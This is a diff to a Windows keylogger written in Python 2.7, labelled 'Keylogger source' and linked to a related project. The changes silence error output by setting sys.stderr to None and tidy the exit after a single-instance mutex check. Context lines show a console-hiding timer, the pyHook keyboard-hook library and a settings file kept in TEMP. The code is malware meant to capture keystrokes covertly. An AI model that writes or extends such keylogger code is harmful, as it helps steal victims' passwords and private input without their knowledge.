@@ -2,10 +2,11 @@
 Keylogger source, Python 2.7
 Referenced from my other project: https://github.com/xp4xbox/Puffader
 '''
-import time, os, threading
+import time, os, threading, sys
 import win32console, win32gui, win32event, win32api, winerror
-from sys import exit
 import pythoncom, pyHook
+
+sys.stderr = None
 
 TMP = os.environ["TEMP"]
 
@@ -19,7 +20,7 @@ objTimer = threading.Timer(0, hide); objTimer.start()
 mutex = win32event.CreateMutex(None, 1, "SPBKEY_mutex_xp4")
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     mutex = None
-    exit(0)
+    sys.exit(0)
 
 strSettings = TMP + "/spbky.txt"
 
